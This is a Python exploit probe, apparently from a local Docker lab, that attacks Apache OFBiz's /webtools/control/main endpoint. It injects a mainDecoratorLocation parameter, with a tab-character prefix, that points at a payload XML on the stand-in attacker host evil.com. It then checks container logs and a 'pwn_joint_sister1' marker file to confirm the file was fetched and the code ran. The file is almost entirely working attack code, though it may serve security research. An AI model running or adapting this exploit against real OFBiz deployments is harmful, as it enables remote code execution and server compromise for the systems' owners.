# -*- coding: utf-8 -*-
"""Final round - OFBiz sister route via GET query string.

POST /webtools/control/main with mainDecoratorLocation rendered the poisoned
main screen but never fetched the sister XML (app-side behavior - OFBiz 18.12
CSRF-token discipline on POST is the prime suspect). This probe replays the
same parameter as a GET query argument.
Truth = infra fetch log + pwn_joint_sister1 marker.
"""
import subprocess
import time

import requests
import urllib3

urllib3.disable_warnings()

TARGET = "https://127.0.0.1:18381"
URI = "/webtools/control/main?mainDecoratorLocation=%09http://evil.com:8000/payloads/joint_sister1.xml"

s = requests.Session()
s.trust_env = False
s.verify = False
s.headers["User-Agent"] = "Mozilla/5.0"

r = s.get(TARGET + URI, timeout=90, allow_redirects=False)
print("[*] GET main?mainDecoratorLocation -> HTTP", r.status_code, len(r.content), "B")
time.sleep(3)

out = subprocess.run(["docker", "logs", "multi-round-lab-infra-1", "--since", "2m"],
                     capture_output=True, text=True, errors="replace")
for line in (out.stdout + out.stderr).splitlines():
    if "sister" in line:
        print("[infra]", line.strip())

out = subprocess.run(["docker", "exec", "multi-round-lab-ofbiz-1", "ls", "-l", "--full-time",
                      "/usr/src/apache-ofbiz/pwn_joint_sister1"],
                     capture_output=True, text=True, errors="replace")
print("[truth]", (out.stdout + out.stderr).strip())
